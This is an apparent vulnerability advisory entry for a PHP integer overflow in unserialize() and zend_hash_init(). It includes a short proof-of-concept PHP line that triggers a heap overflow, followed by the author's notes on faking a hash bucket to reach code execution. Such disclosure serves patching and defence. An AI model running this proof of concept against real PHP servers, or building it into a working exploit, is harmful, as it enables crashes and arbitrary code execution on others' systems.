source: http://www.securityfocus.com/bid/20349/info

PHP is prone to an integer-overflow vulnerability because the application fails to do proper bounds checking on user-supplied data.

An attacker can exploit this vulnerability to execute arbitrary code in the context of the affected application. Failed exploit attempts will likely cause denial-of-service conditions.

<?

 print_r(unserialize('a:1073741823:{i:0;s:30:"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}'));
?>

in function zend_hash_init() int overflow ( ecalloc() )-> heap overflow
here segfault in zend_hash_find() but it's possible to fake the bucket and
exploit a zend_hash_del_index_or_key
i tried a memory dump , just fake the bucked with the pointer of the
$GLOBALS's bucket but segfault before in memory_shutdown...